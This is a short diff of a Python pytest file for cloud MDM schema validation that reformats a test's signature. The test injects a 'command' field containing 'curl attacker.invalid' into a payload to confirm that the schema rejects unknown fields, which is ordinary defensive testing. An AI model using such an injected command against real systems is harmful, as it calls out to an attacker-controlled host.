@@ -128,9 +128,7 @@ def test_cloud_mdm_schema_examples_validate(name: str, payload: dict[str, object
 
 
 @pytest.mark.parametrize("name,payload", list(examples().items()))
-def test_cloud_mdm_schemas_reject_unknown_authority_fields(
-    name: str, payload: dict[str, object]
-) -> None:
+def test_cloud_mdm_schemas_reject_unknown_authority_fields(name: str, payload: dict[str, object]) -> None:
     candidate = copy.deepcopy(payload)
     candidate["command"] = "curl attacker.invalid"
     with pytest.raises(ValidationError):
